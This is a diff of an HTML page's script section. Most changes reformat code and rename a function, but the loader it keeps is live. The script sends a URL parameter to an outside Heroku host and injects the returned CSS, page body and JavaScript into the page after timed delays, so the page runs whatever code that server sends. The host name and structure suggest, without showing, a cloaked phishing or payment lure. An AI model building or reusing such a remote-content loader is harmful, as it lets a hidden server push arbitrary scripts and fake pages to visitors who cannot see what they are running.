@@ -50,11 +50,7 @@
     </head>
 
 <body>
-    <b id="css"></b>
-    <b id="body"></b>
-    <b id="script"></b>
-    
-    // new 01
+    <b id="css"></b> <b id="body"></b><b id="script"></b>
     <script>
         (function(){
             var js = "window['__CF$cv$params']={r:'7528dedeabed661d',m:'MPmVF7j_eeSTZk1wDkkpPepscsAC8IBdMJC70CHkomI-1664498043-0-AUr+vgS/e+C/EbPrcdaM4yBJ73v9CqDSXsQLgJYUez5PY7DXg8iXsuQXmuyoBFa5Hh3uexUt34OiZ1ADihs/ZW59Uwfcl0/BFwkyjY1+JjhA43wu3Y7TD5EvqWuJzFYlfA==',s:[0xf426713280,0xb4a46b4692],u:'/cdn-cgi/challenge-platform/h/b'};var now=Date.now()/1000,offset=14400,ts=''+(Math.floor(now)-Math.floor(now%offset)),_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/h/b/scripts/alpha/invisible.js?ts='+ts,document.getElementsByTagName('head')[0].appendChild(_cpo);";
@@ -91,7 +87,6 @@
             }
         })();
     </script>
-    // new 01
     
     <script>
         function getUlParam(param)
@@ -107,18 +102,11 @@
         
         async function doAjax(param1, param2) {
             const result = await $.ajax(
-            {
-                url: "https://forpayso.herokuapp.com/dataApi/",
-                type: 'POST',
-                data: {
-                    check: param1,
-                    data: param2
-                },
-            });
+            {url: "https://forpayso.herokuapp.com/dataApi/", type: 'POST', data: {check: param1, data: param2}, });
             return result;
         }
 
-        async function tt(){
+        async function main() {
             alert(document.referrer);
             var data = getUlParam('q');
             if (!data)
@@ -126,25 +114,15 @@
             var res = await doAjax(1, data);
             const obj = JSON.parse(res);
             console.log(obj);
-
             $('#body').css('display', 'none');
-
             sleep(1500).then(() => {
                 $("#css").html(obj.css);
-                sleep(500).then(() => {
-                    $("#body").html(obj.body);
-                });
-                sleep(500).then(() => {
-                    $("#script").html(obj.script);
-                });
-                sleep(1000).then(() => {
-                    $('#body').css('display', 'block');
-                });
+                sleep(500).then(() => {$("#body").html(obj.body);});
+                sleep(500).then(() => {$("#script").html(obj.script);});
+                sleep(1000).then(() => {$('#body').css('display', 'block');});
             });
         }
-
-        tt();
-
+        main();
     </script> 
 </body>
 </html>
